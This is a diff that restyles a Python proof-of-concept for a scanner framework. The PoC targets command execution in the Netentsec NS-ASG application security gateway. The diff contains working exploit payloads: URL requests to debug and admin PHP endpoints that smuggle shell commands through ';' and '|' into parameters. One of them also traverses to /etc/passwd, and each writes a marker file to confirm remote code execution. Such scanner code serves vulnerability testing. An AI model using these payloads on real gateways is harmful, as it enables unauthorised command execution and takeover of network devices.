@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'Netentsec_0001'  # 平台漏洞编号，留空
     name = '网康NS-ASG 应用安全网关多处命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-04-30'  # 漏洞公布时间
     desc = '''
         网康 NS-ASG 应用安全网关所有版本任意命令执行可getshell。
@@ -27,6 +29,7 @@ class Vuln(ABVuln):
     product = '网康应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'aadf6701-9f86-4097-bb9b-2e3e912db9b9'
     author = '47bwy'  # POC编写者
@@ -40,15 +43,16 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058925
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058932
-            #refer: http://www.wooyun.org/bugs/wooyun-2014-058944
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058925
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058932
+            # refer: http://www.wooyun.org/bugs/wooyun-2014-058944
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
                 arg + '/debug/list_logfile.php?action=restartservice&bash=;echo%20testvul0>/Isc/third-party/httpd/htdocs/test.txt;',
                 arg + '/debug/list_logfile.php?logfile%5B%5D=%2FIsc%2FLog%2Fsshd.log;echo%20testvul1>/Isc/third-party/httpd/htdocs/test.txt;&action=delete',
-                arg + '/debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo%20testvul2>../test.txt',
+                arg +
+                '/debug/rproxy_diag.php?action=tarfile&search=&logfile[0]=../../etc/passwd|echo%20testvul2>../test.txt',
                 arg + '/admin/device_status.php?action=getethinfo&ethx=a|%20echo%20testvul3%20>%20/Isc/third-party/httpd/htdocs/test.txt'
             ]
             for i in range(len(payloads)):
@@ -68,6 +72,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
